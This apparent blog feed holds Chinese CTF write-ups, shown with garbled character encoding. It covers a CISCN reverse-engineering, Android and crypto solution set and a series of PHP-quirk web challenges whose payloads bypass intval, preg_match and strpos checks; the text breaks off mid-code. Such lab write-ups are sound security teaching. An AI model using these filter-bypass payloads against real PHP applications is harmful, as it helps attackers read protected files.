alt="image.png"><br>è·Ÿç€æ­¥éª¤èµ°ï¼Œç‚¹å‡»ç»¿æ——å­æŒ‰ç©ºæ ¼å¼€å§‹<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574961-d96409ba-4664-4b49-903b-49da9aa9f548.png" alt="image.png"><br>è¿è¡Œåˆ°lockè¿™é‡Œæç¤ºè¾“å…¥flagï¼Œçœ‹åˆ°lockçš„æ§ä»¶é‡Œé¢æœ‰å¤šä¸ªæ’å…¥æ•°å­—æ“ä½œï¼Œåº”è¯¥æ˜¯å¯†æ–‡<br>æå–å‡ºæ¥å¾—åˆ°<code>[102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30]</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368575470-1a7f2707-9427-480a-bae4-b585f92cb8fb.png" alt="image.png"><br>åŠ å¯†é€»è¾‘åœ¨å³è¾¹ï¼Œæ˜¯å„é¡¹å¼‚æˆ–<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574439-63fef859-1b6e-4212-a653-8a2d0970e8d0.png" alt="image.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># babyRE</span></span><br><span class="line">flag=[<span class="number">102</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">28</span>,<span class="number">74</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">85</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">75</span>,<span class="number">20</span>,<span class="number">92</span>,<span class="number">92</span>,<span class="number">8</span>,<span class="number">28</span>,<span class="number">25</span>,<span class="number">81</span>,<span class="number">83</span>,<span class="number">7</span>,<span class="number">28</span>,<span class="number">76</span>,<span class="number">88</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">29</span>,<span class="number">73</span>,<span class="number">0</span>,<span class="number">86</span>,<span class="number">4</span>,<span class="number">87</span>,<span class="number">87</span>,<span class="number">82</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">4</span>,<span class="number">85</span>,<span class="number">87</span>,<span class="number">30</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i]=flag[i] ^ flag[i-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><code>flag&#123;12307bbf-9e91-4e61-a900-dd26a6d0ea4c&#125;</code></p><h2 id="ezAndroid"><a href="#ezAndroid" class="headerlink" title="ezAndroid"></a>ezAndroid</h2><p>ç™»å½•ç½‘ç«™è¯•äº†ä¸€ä¸‹æ³¨å…¥å¥½åƒä¸è¡Œ<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368574338-83b939d1-02c4-479d-a841-af1c58f9c8af.png" alt="image.png"><br>æç¤ºè¯´æ˜¯æ‰¾é™„ä»¶æ¼æ´ï¼Œé‚£å°±æ‰¾å‘—ï¼Œä¸€å †apké‡Œé¢å°±cpweb.apkæœ€å¯ç–‘<br>ç”¨jadx-guiæ‰“å¼€ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ã€‚å…ˆæœç´¢MainActivityï¼Œä½†æ˜¯å¥½åƒæ²¡å•¥æœ‰ç”¨çš„ä¸œè¥¿<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368575624-7f32685f-51c9-4514-aba5-500a2d98f94b.png" alt="image.png"><br>ä½†æ˜¯è·ŸMainActivityåŒç›®å½•ä¸‹æœ‰å¥½å¤šä¸ªServerï¼ŒçŒœæµ‹æ¼æ´å¯èƒ½å°±å‡ºåœ¨è¿™é‡Œï¼Œé‡ç‚¹çœ‹äº†ä¸€ä¸‹WebServer<br>è¿™é‡Œæœ‰ä¸ªè·¯å¾„ç©¿è¶Šæ‹¼æ¥ï¼Œåº”è¯¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚è¯·é˜Ÿé‡Œçš„webæ‰‹æŠ“åŒ…ä¸€ä¸‹ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685368575781-1972b843-34d4-4d88-8fe1-df65ec45b035.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685269052746-fa0d3dab-1e41-4f3a-a1d2-92ea55c9b64d.png" alt="image.png"></p><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p><code>flag&#123;15131359-6d71-45d3-b2ad-73e2f2335a7c&#125;</code></p><h1 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="27æ—¥-åŸºäºå›½å¯†SM2ç®—æ³•çš„å¯†é’¥å¯†æ–‡åˆ†å‘"><a href="#27æ—¥-åŸºäºå›½å¯†SM2ç®—æ³•çš„å¯†é’¥å¯†æ–‡åˆ†å‘" class="headerlink" title="27æ—¥_åŸºäºå›½å¯†SM2ç®—æ³•çš„å¯†é’¥å¯†æ–‡åˆ†å‘"></a>27æ—¥_åŸºäºå›½å¯†SM2ç®—æ³•çš„å¯†é’¥å¯†æ–‡åˆ†å‘</h2><blockquote><p><a href="https://const.net.cn/tool/sm2/genkey/">https://const.net.cn/tool/sm2/genkey/</a><br><a href="https://const.net.cn/tool/sm2/sm2-decrypt/">https://const.net.cn/tool/sm2/sm2-decrypt/</a><br><a href="https://const.net.cn/tool/sm4/sm4-ecb-decrypt/">https://const.net.cn/tool/sm4/sm4-ecb-decrypt/</a> </p></blockquote><p>ä½¿ç”¨ç½‘ç«™å†…å®¹æŒ‰ç…§æ­¥éª¤æ“ä½œå³å¯ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685167591369-86affce6-458e-4054-ac34-059c28c9035e.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1685167558494-787731cf-a5ab-49c2-bede-5f12f52b8747.png" alt="image.png"></p><h2 id="27æ—¥-Sign-in-passwd"><a href="#27æ—¥-Sign-in-passwd" class="headerlink" title="27æ—¥_Sign_in_passwd"></a>27æ—¥_Sign_in_passwd</h2><p>æŒ‰ç…§æ’åˆ—æ˜ å°„åŠ å¯†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import urllib.parse</span><br><span class="line">after = r&#x27;GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5&#x27;</span><br><span class="line">asc = urllib.parse.unquote(after)</span><br><span class="line">former = r&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span><br><span class="line">change = str.maketrans(asc, former)</span><br><span class="line">flag = r&#x27;j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D&#x27;</span><br><span class="line">flaga = flag.translate(change)</span><br><span class="line">print(base64.b64decode(flaga).decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web89-web105phpç‰¹æ€§ç¯‡ï¼ˆä¸€ï¼‰</title>
      <link href="/2023/05/16/web89-web105php%E7%89%B9%E6%80%A7%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/05/16/web89-web105php%E7%89%B9%E6%80%A7%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, $num))&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡äº‹ä¸å†³å…ˆè¯•è¯•æ•°ç»„æï¼Œ<code>?num[]=1</code></p><h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($num===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval($num,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        echo intval($num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4476ååŠ ä»»æ„å­—ç¬¦å³å¯ã€‚<code>?num=4476a</code>ã€‚<br>æˆ‘ä»¬é»˜è®¤çš„ä¸Šä¼ ç±»å‹å°±æ˜¯å­—ç¬¦å‹ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ªå­—ç¬¦å°±å¯ä»¥ã€‚</p><h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><blockquote><p><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">https://blog.csdn.net/qq_46091464/article/details/108278486</a><br><a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">show_source(__FILE__);</span><br><span class="line">include(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">$a=$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, $a))&#123;</span><br><span class="line">        echo <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜ä¸€ä¸Šæ¥æ²¡çœ‹æ‡‚ï¼Œè¦ææ‡‚ä»–å…ˆè¦ç†è§£ä»–çš„è¿‡æ»¤æ˜¯ä»€ä¹ˆæ„æ€ã€‚</p><ul><li><code>^</code> â€œè¡Œé¦–â€å…ƒå­—ç¬¦ (^) ä»…åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®</li><li><code>**$**</code>â€œè¡Œæœ«â€å…ƒå­—ç¬¦ ($) ä»…åŒ¹é…å­—ç¬¦ä¸²æœ«å°¾ï¼Œæˆ–è€…æœ€åçš„æ¢è¡Œç¬¦(é™¤éè®¾ç½®äº† D ä¿®é¥°ç¬¦)</li></ul><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œpreg_matchå‡½æ•°ä¼šè®¤ä¸ºç›®æ ‡å­—ç¬¦ä¸²æ˜¯å•è¡Œç»„æˆçš„ï¼Œå½“ç›®æ ‡å­—ç¬¦ä¸²ä¸­æœ‰æ¢è¡Œç¬¦æˆ–è€…åŒ¹é…ä¸­å‡ºç°^æˆ–è€…$ä¼šå—åˆ°å½±å“ã€‚<br>å¹¶ä¸”æœ«å°¾çš„mçš„æ„ä¹‰å¦‚ä¸‹ã€‚<br>å› æ­¤ç»¼ä¸Šæ„æ€å°±æ˜¯ï¼Œè¦æ±‚ä¼ å…¥å†…å®¹ä¸­æœ‰phpï¼Œä½†æ˜¯ç¬¬ä¸€è¡Œä¸­æ²¡æœ‰phpã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681977422503-fb5ac281-d0e2-4af8-a0ba-db71b32378ad.png" alt="image.png"><br>å› æ­¤payloadï¼š<code>abc%0aphp</code></p><h2 id="å¤‡æ³¨"><a href="#å¤‡æ³¨" class="headerlink" title="å¤‡æ³¨"></a>å¤‡æ³¨</h2><p>é™„PCREæ¨¡å¼ä¿®æ­£ç¬¦</p><blockquote><p>å‚è€ƒæ–‡ç« Â·ï¼š<a href="https://blog.csdn.net/forest_fire/article/details/50944901">https://blog.csdn.net/forest_fire/article/details/50944901</a></p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681977497562-fb227ad1-c636-42ab-8b63-5ef842146ece.png" alt="image.png"></p><p>wpä¸­æåˆ°çš„å¦ä¸€ä¸ªæ¼æ´ï¼š</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</a></p></blockquote><h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>intval()å‡½æ•°å¦‚æœ$baseä¸º0åˆ™$varä¸­å­˜åœ¨å­—æ¯çš„è¯é‡åˆ°å­—æ¯å°±åœæ­¢è¯»å– ä½†æ˜¯eè¿™ä¸ªå­—æ¯æ¯”è¾ƒç‰¹æ®Šï¼Œå¯ä»¥åœ¨PHPä¸­ä¸æ˜¯ç§‘å­¦è®¡æ•°æ³•ã€‚æ‰€ä»¥ä¸ºäº†ç»•è¿‡å‰é¢çš„==4476æˆ‘ä»¬å°±å¯ä»¥æ„é€  4476e123 å…¶å®ä¸éœ€è¦æ˜¯eå…¶ä»–çš„å­—æ¯ä¹Ÿå¯ä»¥ã€‚<br>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">0x117c</span>    <span class="comment">//åå…­è¿›åˆ¶</span></span><br><span class="line">?num=<span class="number">010574</span>    <span class="comment">//å…«è¿›åˆ¶</span></span><br><span class="line">?num=<span class="number">4476e123</span></span><br></pre></td></tr></table></figure><h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åå…­è¿›åˆ¶é‡Œé¢ä¼šæœ‰å­—ç¬¦ï¼Œä½†æ˜¯å…«è¿›åˆ¶ä»ç„¶å¯ä»¥ä½¿ç”¨ã€‚<br>payloadï¼š<code>010574</code></p><h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strpos() få‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ã€‚è¿™é‡Œæ£€æµ‹äº†ä¸è®©ç¬¬ä¸€ä½ä¸º0ã€‚<br>ä½†æ˜¯è¿™ä¸ªå‡½æ•°æ˜¯å¯ä»¥è¢«ç»•è¿‡çš„ï¼Œåˆ©ç”¨<code>%0a</code>ã€<code>.</code>ã€<code>+</code>ã€<code> </code>éƒ½å¯ä»¥ä½¿ç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">å¯¹äº<span class="title function_ invoke__">strpos</span>()å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¢è¡Œè¿›è¡Œç»•è¿‡ï¼ˆ%<span class="number">0</span>aï¼‰</span><br><span class="line">payload:?num=%<span class="number">0</span>a010574</span><br><span class="line">ä¹Ÿå¯ä»¥å°æ•°ç‚¹ç»•è¿‡</span><br><span class="line">payloadï¼š?num=<span class="number">4476.0</span></span><br><span class="line">å› ä¸º<span class="title function_ invoke__">intval</span>()å‡½æ•°åªè¯»å–æ•´æ•°éƒ¨åˆ†</span><br><span class="line">è¿˜å¯ä»¥å…«è¿›åˆ¶ç»•è¿‡(%<span class="number">20</span>æ˜¯ç©ºæ ¼çš„urlç¼–ç å½¢å¼)</span><br><span class="line">payloadï¼š?num=%<span class="number">20010574</span></span><br><span class="line">?num= <span class="number">010574</span> <span class="comment">// å‰é¢åŠ ä¸ªç©ºæ ¼</span></span><br><span class="line">?num=+<span class="number">010574</span> </span><br><span class="line">?num=+<span class="number">4476.0</span></span><br></pre></td></tr></table></figure><h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒä¸Šé¢˜payloadï¼š<code>num=%20010574</code></p><h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payloadï¼š<code>?u=./flag.php</code>è¿™ä¸ª./å¯ä»¥è¡¨ç¤ºå½“å‰ç›®å½•</p><h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span 